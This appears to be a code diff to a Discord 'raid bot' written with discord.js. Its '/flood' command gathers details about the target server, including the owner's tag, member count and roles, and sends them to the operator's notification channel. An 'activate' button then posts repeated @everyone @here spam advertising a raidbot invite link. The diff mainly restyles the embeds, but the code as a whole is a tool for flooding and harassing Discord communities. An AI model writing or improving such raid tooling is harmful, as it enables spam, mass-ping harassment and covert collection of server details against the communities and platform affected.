@@ -8,7 +8,7 @@ const {
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-const GUILD_ID = process.env.GUILD_ID; // optional
+const GUILD_ID = process.env.GUILD_ID;
 const NOTIFY_CHANNEL_ID = process.env.NOTIFY_CHANNEL_ID;
 const SELF_URL = process.env.SELF_URL;
 
@@ -72,7 +72,7 @@ client.on('interactionCreate', async interaction => {
   try {
     // Slash command /flood
     if(interaction.isChatInputCommand() && interaction.commandName === 'flood'){
-      const guild = interaction.guild;
+      const guild = await client.guilds.fetch(interaction.guildId);
       const channel = interaction.channel;
       const memberCount = guild?.memberCount || 0;
       const guildName = guild?.name || "Unknown Server";
@@ -85,27 +85,35 @@ client.on('interactionCreate', async interaction => {
       let roast = roasts[Math.floor(Math.random() * roasts.length)];
       roast = roast.replace('%SERVER%', guildName).replace('%MEMBERS%', memberCount);
 
-      // --- Embed with server stats ---
+      // Fetch guild owner safely
+      let ownerTag = "Unknown";
+      try {
+        const owner = await guild.fetchOwner();
+        ownerTag = owner.user.tag;
+      } catch {}
+
+      // --- Fancy embed ---
       const embed = new EmbedBuilder()
-        .setTitle('📌 COMMAND EXECUTED')
+        .setTitle('🅕🅛🅞🅞🅓 📌 COMMAND EXECUTED')
         .setColor(0xFF0000)
         .addFields(
-          { name: '🌐 Server Name', value: guildName, inline: true },
-          { name: '👥 Members', value: `${memberCount}`, inline: true },
-          { name: '👑 Server Owner', value: guild?.ownerId ? `<@${guild.ownerId}>` : "Unknown", inline: true },
-          { name: '📅 Server Created', value: guild?.createdAt?.toLocaleDateString() || 'N/A', inline: true },
-          { name: '🎭 Roles', value: `${guild?.roles?.cache.size || 0}`, inline: true },
-          { name: '😂 Emojis', value: `${guild?.emojis?.cache.size || 0}`, inline: true },
-          { name: '🚀 Boost Level', value: `${guild?.premiumTier || 0}`, inline: true },
-          { name: '💎 Boost Count', value: `${guild?.premiumSubscriptionCount || 0}`, inline: true },
-          { name: '✅ Verification Level', value: `${guild?.verificationLevel || 'Unknown'}`, inline: true },
-          { name: '📝 Channel', value: `#${channel?.name || 'Unknown'}`, inline: true },
-          { name: '🙋 Command Run By', value: interaction.user.tag, inline: true },
-          { name: '📡 Bot Latency', value: `${client.ws.ping}ms`, inline: true }
+          { name: '🌐 𝗦𝗲𝗿𝘃𝗲𝗿 𝗡𝗮𝗺𝗲', value: `**${guildName}**`, inline: true },
+          { name: '👥 𝗠𝗲𝗺𝗯𝗲𝗿𝘀', value: `**${memberCount}**`, inline: true },
+          { name: '👑 𝗦𝗲𝗿𝘃𝗲𝗿 𝗢𝘄𝗻𝗲𝗿', value: `**${ownerTag}**`, inline: true },
+          { name: '📅 𝗦𝗲𝗿𝘃𝗲𝗿 𝗖𝗿𝗲𝗮𝘁𝗲𝗱', value: `**${guild?.createdAt?.toLocaleDateString() || 'N/A'}**`, inline: true },
+          { name: '🎭 𝗥𝗼𝗹𝗲𝘀', value: `**${guild.roles.cache.size}**`, inline: true },
+          { name: '😂 𝗘𝗺𝗼𝗷𝗶𝘀', value: `**${guild.emojis.cache.size}**`, inline: true },
+          { name: '🚀 𝗕𝗼𝗼𝘀𝘁 𝗟𝗲𝘃𝗲𝗹', value: `**${guild.premiumTier}**`, inline: true },
+          { name: '💎 𝗕𝗼𝗼𝘀𝘁 𝗖𝗼𝘂𝗻𝘁', value: `**${guild.premiumSubscriptionCount || 0}**`, inline: true },
+          { name: '✅ 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗟𝗲𝘃𝗲𝗹', value: `**${guild.verificationLevel}**`, inline: true },
+          { name: '📝 𝗖𝗵𝗮𝗻𝗻𝗲𝗹', value: `**#${channel?.name || 'Unknown'}**`, inline: true },
+          { name: '🙋 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗥𝘂𝗻 𝗕𝘆', value: `**${interaction.user.tag}**`, inline: true },
+          { name: '📡 𝗕𝗼𝘁 𝗟𝗮𝘁𝗲𝗻𝗰𝘆', value: `**${client.ws.ping}ms**`, inline: true }
         )
-        .setTimestamp(new Date());
+        .setTimestamp(new Date())
+        .setFooter({ text: '🚨 FLOOD NOTIFIER SYSTEM', iconURL: client.user.displayAvatarURL() });
 
-      // --- Send to notify channel safely ---
+      // --- Send to notify channel ---
       const notifyChannel = await client.channels.fetch(NOTIFY_CHANNEL_ID).catch(() => null);
       if(notifyChannel && notifyChannel.isTextBased() && notifyChannel.permissionsFor(client.user).has('SendMessages')){
         await notifyChannel.send({ content: roast, embeds: [embed] });
@@ -113,7 +121,7 @@ client.on('interactionCreate', async interaction => {
 
       // --- Reply ephemeral flood menu ---
       const floodEmbed = new EmbedBuilder()
-        .setTitle('READY TO FLOOD?')
+        .setTitle('🅕🅛🅞🅞🅓 READY TO FLOOD?')
         .setColor(0xFF0000);
 
       const row = new ActionRowBuilder().addComponents(
@@ -123,7 +131,7 @@ client.on('interactionCreate', async interaction => {
 
       await interaction.reply({ embeds: [floodEmbed], components: [row], ephemeral: true });
 
-      // Remove from cache after 30 seconds to allow another command
+      // Clear cache after 30 seconds
       setTimeout(() => floodCache.delete(interaction.user.id), 30000);
     }
 
@@ -134,7 +142,7 @@ client.on('interactionCreate', async interaction => {
 
       if(interaction.customId === 'activate'){
         const spamText = `@everyone @here \n**FREE DISCORD RAIDBOT WITH CUSTOM MESSAGES** https://discord.gg/6AGgHe4MKb`;
-        await interaction.reply({ content: spamText }); // public
+        await interaction.reply({ content: spamText });
         for(let j=0;j<4;j++){
           setTimeout(()=>interaction.followUp({ content: spamText }), 800*(j+1));
         }
